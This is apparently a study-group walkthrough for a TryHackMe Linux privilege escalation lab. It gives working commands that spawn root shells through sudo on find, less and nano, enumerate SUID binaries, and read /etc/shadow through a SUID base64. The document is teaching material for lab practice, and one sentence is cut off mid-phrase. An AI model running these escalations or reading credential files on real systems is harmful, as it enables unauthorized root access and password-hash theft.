# HackerFrogs AfterSchool Network Hacking Session 9
## Session Topic: Privilege Escalation Pt 1 /w TryHackMe
# Challenge 1: TryHackMe Linux Privilege Escalation
## TryHackMe Link
https://tryhackme.com/room/linprivesc
### YouTube Walkthrough Link
https://youtube.com/live/Kl4uF2txMs4
### Method of Solve
* Step 1: Click on the Task 6 header in the TryHackMe page, then click on the green "Start Machine" button
* Step 3: wait 2 minutes for the machine to finish loading
## Part 1: Privilege Escalation via Sudo Commands
We will use the sudo permissions this user has with the `find`, `less` and `nano` commands
* Step 1: In the terminal use the following command to see our user's `sudo` permissions
```
sudo -l
```
This tells us that our user can use the `sudo` command with the `find`, `less` and `nano` commands
* Step 2: Use the following `find` command with `sudo` to gain `root` level shell access
```
sudo find . -exec /bin/bash \; -quit
```
* Step 3: Confirm that we are now the `root` user with the `whoami` command, then `exit` the root shell
```
whoami
exit
```
* Step 4: Use the following `sudo` command with the `less` command to get `root` level shell access
```
sudo less /etc/profile
```
While inside of the less program, we can open a shell with the following command
```
!/bin/bash
```
* Step 5: Use the following commands to confirm our `root` access, then `exit` the shell
```
whoami
exit
q
```
* Step 6: Use the following `sudo` command with the `nano` command to get `root` level shell access
```
sudo nano
```
Now use the `ctrl+r`, then `ctrl+x` shortcuts to access the console, then use this command
```
reset; bash 1>&0 2>&0
```
* Step 7: Use the following commands to confirm our `root` access, then `exit` the shell
```
whoami
exit
```
## Part 2: Privilege Escalation via SUID Binaries
In this section, we'll be doing privilege escalation attacks via the 
* Step 1: In the bottom of the terminal, select `terminate the machine`
* Step 2: Go to Task 7 in the TryHackMe webpage and click the `Start Machine` button
* Step 3: After the terminal finishes initializing, use the following command to find out which SUID binaries exist on the system:
```
find / -perm -4000 2>/dev/null
```
One unusual SUID binary in this list is `base64`
* Step 4: Use the following command to read a restricted file with `base64`
```
base64 /etc/shadow | base64 -d
```
